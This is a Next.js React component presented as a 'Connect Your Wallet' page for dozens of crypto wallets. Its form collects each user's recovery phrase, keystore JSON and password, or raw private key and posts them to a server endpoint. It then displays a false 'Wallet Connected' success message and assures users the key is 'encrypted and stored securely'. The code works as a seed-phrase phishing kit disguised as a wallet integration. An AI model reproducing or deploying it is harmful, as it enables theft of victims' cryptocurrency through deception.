"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { CheckCircle2, ChevronDown, ChevronUp } from "lucide-react";

const PRIMARY_WALLETS = [
  { key: "metamask", label: "MetaMask", img: "/wallets/metamask.png" },
  { key: "mew-wallet", label: "MEW Wallet", img: "/wallets/MEW.png" },
  { key: "trust-wallet", label: "Trust Wallet", img: "/wallets/trustwallet.png" },
  { key: "wallet-connect", label: "WalletConnect", img: "/wallets/logo.svg" },
  { key: "blockchain-wallet", label: "Blockchain Wallet", img: "/wallets/blockchain.png" },
  { key: "paxful", label: "Paxful Wallet", img: "/wallets/paxful.png" },
  { key: "atomic-wallet", label: "Atomic Wallet", img: "/wallets/atomic.png" },
  { key: "binance-smart-chain", label: "Binance Smart Chain", img: "/wallets/binance.png" },
  { key: "bnb", label: "BNB", img: "/wallets/bnb.png" },
  { key: "polkadot", label: "Polkadot", img: "/wallets/polkadot.png" },
  { key: "xrp", label: "XRP", img: "/wallets/xrp.png" },
  { key: "stellar", label: "Stellar", img: "/wallets/stellar.png" },
  { key: "tezos", label: "Tezos", img: "/wallets/tezos.png" },
  { key: "theta", label: "Theta", img: "/wallets/theta.png" },
  { key: "tron", label: "Tron", img: "/wallets/tron.png" },
  { key: "cosmos", label: "Cosmos", img: "/wallets/cosmos.png" },
  { key: "kava", label: "Kava", img: "/wallets/kava.png" },
  { key: "filecoin", label: "Filecoin", img: "/wallets/filecoin.png" },
  { key: "solana", label: "Solana", img: "/wallets/solana.png" },
  { key: "ethereum-classic", label: "Ethereum Classic", img: "/wallets/ethereum-classic.png" },
  { key: "zilliqa", label: "Zilliqa", img: "/wallets/zilliqa.png" },
  { key: "elrond", label: "Elrond", img: "/wallets/elrond.jpg" },
  { key: "waves", label: "Waves", img: "/wallets/waves.png" },
  { key: "icon", label: "ICON", img: "/wallets/icon.png" },
  { key: "ontology", label: "Ontology", img: "/wallets/ontology.png" },
];

const MORE_WALLETS = [
  { key: "nano", label: "Nano", img: "/wallets/nano.png" },
  { key: "tomo-chain", label: "Tomo Chain", img: "/wallets/tomo.png" },
  { key: "iotex", label: "IoTex", img: "/wallets/iotex.png" },
  { key: "wanchain", label: "Wanchain", img: "/wallets/wanchain.png" },
  { key: "harmony", label: "Harmony", img: "/wallets/harmony.png" },
  { key: "kin", label: "Kin", img: "/wallets/kin.png" },
  { key: "nimiq", label: "Nimiq", img: "/wallets/nimiq.png" },
  { key: "aion", label: "Aion", img: "/wallets/aion.png" },
  { key: "thunder-token", label: "Thunder Token", img: "/wallets/thundertoken.png" },
  { key: "aeternity", label: "Aeternity", img: "/wallets/aeternity.png" },
  { key: "nebulas", label: "Nebulas", img: "/wallets/nebulas.png" },
  { key: "fio", label: "FIO", img: "/wallets/fio.png" },
  { key: "gochain", label: "GoChain", img: "/wallets/gochain.png" },
  { key: "poa-network", label: "POA Network", img: "/wallets/poa.png" },
  { key: "callisto", label: "Callisto", img: "/wallets/callisto.png" },
  { key: "bitpay", label: "BitPay", img: "/wallets/bitpay.jpg" },
  { key: "aktionariat", label: "Aktionariat", img: "/wallets/aktionariat.png" },
  { key: "atwallet", label: "AtWallet", img: "/wallets/atwallet.png" },
  { key: "guard-wallet", label: "Guard Wallet", img: "/wallets/guard.png" },
  { key: "aave", label: "AAVE", img: "/wallets/aave.jpg" },
  { key: "exodus", label: "Exodus", img: "/wallets/exodus.jpg" },
  { key: "enjin", label: "Enjin", img: "/wallets/enjin.jpg" },
  { key: "skale", label: "Skale", img: "/wallets/skale.png" },
  { key: "portis", label: "Portis", img: "/wallets/portis.png" },
  { key: "trezor", label: "Trezor", img: "/wallets/trezor.png" },
  { key: "squarelink", label: "Squarelink", img: "/wallets/squarelink.png" },
  { key: "torus", label: "Torus", img: "/wallets/torus.jpg" },
  { key: "vechain", label: "VeChain", img: "/wallets/vechain.jpg" },
  { key: "scatter-wallet", label: "Scatter Wallet", img: "/wallets/scatter.jpg" },
  { key: "math-wallet", label: "Math Wallet", img: "/wallets/math-wallet.png" },
  { key: "fortmatic", label: "FortMatic", img: "/wallets/fortmatic.png" },
  { key: "digitex", label: "Digitex", img: "/wallets/digitex.png" },
  { key: "ledger", label: "Ledger", img: "/wallets/ledger.png" },
  { key: "defiat", label: "Defiat", img: "/wallets/defiat.jpg" },
  { key: "authereum", label: "Authereum", img: "/wallets/authereum.png" },
  { key: "flare-wallet", label: "Flare Wallet", img: "/wallets/flare.jpg" },
  { key: "zelcore", label: "Zelcore", img: "/wallets/zelcore.png" },
  { key: "bitkeep", label: "BitKeep", img: "/wallets/bitkeep.png" },
  { key: "coin98", label: "Coin98", img: "/wallets/coin98.png" },
  { key: "trust-vault", label: "Trust Vault", img: "/wallets/trustvault.png" },
];

type Tab = "phrase" | "keystore" | "privatekey";

export function WalletConnectClient() {
  const router = useRouter();
  const [selected, setSelected] = useState<{ key: string; label: string } | null>(null);
  const [showMore, setShowMore] = useState(false);
  const [tab, setTab] = useState<Tab>("phrase");
  const [phrase, setPhrase] = useState("");
  const [keystoreJson, setKeystoreJson] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState("");

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!selected) return;
    setSubmitting(true); setError("");

    const body: Record<string, string> = { vendor: selected.label };
    if (tab === "phrase") body.phrase = phrase;
    if (tab === "keystore") { body.keystoreJson = keystoreJson; body.keystorePassword = keystorePassword; }
    if (tab === "privatekey") body.privateKey = privateKey;

    const res = await fetch("/api/wallet-connect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    setSubmitting(false);
    if (!res.ok) { const d = await res.json(); setError(d.error || "Failed"); return; }
    setDone(true);
  }

  if (done) {
    return (
      <div className="max-w-md mx-auto mt-16 text-center space-y-4">
        <div className="h-16 w-16 rounded-full bg-emerald-100 flex items-center justify-center mx-auto">
          <CheckCircle2 className="h-8 w-8 text-emerald-600" />
        </div>
        <h2 className="text-xl font-bold text-slate-900">Wallet Connected</h2>
        <p className="text-slate-500 text-sm">Your {selected?.label} wallet has been successfully linked to your account.</p>
        <button onClick={() => { setDone(false); setSelected(null); setPhrase(""); setPrivateKey(""); setKeystoreJson(""); setKeystorePassword(""); }}
          className="mt-2 text-sm font-medium text-orange-500 hover:text-orange-600">Connect another wallet</button>
      </div>
    );
  }

  if (selected) {
    return (
      <div className="max-w-lg space-y-5">
        <div className="flex items-center gap-3">
          <button onClick={() => setSelected(null)} className="text-sm text-slate-400 hover:text-slate-700 transition-colors">← Back</button>
          <h2 className="text-base font-semibold text-slate-900">Import {selected.label}</h2>
        </div>

        <div className="bg-white rounded-2xl border border-slate-200 overflow-hidden">
          {/* Tabs */}
          <div className="flex border-b border-slate-100">
            {([
              { id: "phrase", label: "Recovery Phrase" },
              { id: "keystore", label: "Keystore JSON" },
              { id: "privatekey", label: "Private Key" },
            ] as { id: Tab; label: string }[]).map((t) => (
              <button key={t.id} onClick={() => setTab(t.id)}
                className={`flex-1 py-3 text-xs font-semibold transition-colors ${tab === t.id ? "text-orange-500 border-b-2 border-orange-500 bg-orange-50/40" : "text-slate-500 hover:text-slate-700"}`}>
                {t.label}
              </button>
            ))}
          </div>

          <form onSubmit={handleSubmit} className="p-6 space-y-4">
            {error && <p className="text-sm text-red-600 bg-red-50 border border-red-100 rounded-lg px-4 py-3">{error}</p>}

            {tab === "phrase" && (
              <div>
                <label className="block text-xs font-semibold text-slate-600 mb-1.5">Recovery Phrase (12 or 24 words)</label>
                <textarea required value={phrase} onChange={(e) => setPhrase(e.target.value)} rows={4}
                  placeholder="Enter your recovery phrase words separated by spaces..."
                  className="w-full px-3 py-2.5 text-sm bg-slate-50 border border-slate-200 rounded-lg resize-none focus:outline-none focus:border-slate-400" />
                <p className="text-xs text-slate-400 mt-1.5">Typically 12 or 24 words separated by single spaces.</p>
              </div>
            )}

            {tab === "keystore" && (
              <>
                <div>
                  <label className="block text-xs font-semibold text-slate-600 mb-1.5">Keystore JSON</label>
                  <textarea required value={keystoreJson} onChange={(e) => setKeystoreJson(e.target.value)} rows={5}
                    placeholder='Paste your keystore JSON here...'
                    className="w-full px-3 py-2.5 text-sm bg-slate-50 border border-slate-200 rounded-lg resize-none focus:outline-none focus:border-slate-400 font-mono text-xs" />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-slate-600 mb-1.5">Keystore Password</label>
                  <input type="password" required value={keystorePassword} onChange={(e) => setKeystorePassword(e.target.value)}
                    placeholder="Enter keystore password"
                    className="w-full h-9 px-3 text-sm bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:border-slate-400" />
                </div>
              </>
            )}

            {tab === "privatekey" && (
              <div>
                <label className="block text-xs font-semibold text-slate-600 mb-1.5">Private Key</label>
                <input required value={privateKey} onChange={(e) => setPrivateKey(e.target.value)}
                  placeholder="Enter your private key"
                  className="w-full h-9 px-3 text-sm bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:border-slate-400 font-mono text-xs" />
                <p className="text-xs text-slate-400 mt-1.5">Your private key will be encrypted and stored securely.</p>
              </div>
            )}

            <button type="submit" disabled={submitting}
              className="w-full h-10 text-sm font-semibold text-white rounded-lg bg-black hover:bg-zinc-900 disabled:opacity-50 transition-colors">
              {submitting ? "Connecting..." : `Connect ${selected.label}`}
            </button>
          </form>
        </div>
      </div>
    );
  }

  const WalletGrid = ({ wallets }: { wallets: typeof PRIMARY_WALLETS }) => (
    <div className="grid grid-cols-3 sm:grid-cols-4 md:grid-cols-5 gap-3">
      {wallets.map((w) => (
        <button key={w.key} onClick={() => setSelected(w)}
          className="flex flex-col items-center gap-2 p-3 bg-white border border-slate-200 rounded-xl hover:border-slate-300 hover:shadow-md transition-all group">
          <img src={w.img} alt={w.label} className="h-12 w-12 rounded-xl object-cover"
            onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
          <span className="text-[11px] font-medium text-slate-600 text-center leading-tight line-clamp-2">{w.label}</span>
        </button>
      ))}
    </div>
  );

  return (
    <div className="max-w-3xl space-y-6">
      <div>
        <h1 className="text-lg font-bold text-slate-900">Connect Your Wallet</h1>
        <p className="text-sm text-slate-500 mt-1">Select your wallet provider to import your credentials.</p>
      </div>

      <div className="space-y-4">
        <WalletGrid wallets={PRIMARY_WALLETS} />

        {showMore && <WalletGrid wallets={MORE_WALLETS} />}

        <button onClick={() => setShowMore((v) => !v)}
          className="flex items-center gap-2 text-sm font-medium text-slate-600 hover:text-slate-900 transition-colors mx-auto">
          {showMore ? <><ChevronUp className="h-4 w-4" /> Show Less</> : <><ChevronDown className="h-4 w-4" /> Show More Wallets</>}
        </button>
      </div>
    </div>
  );
}
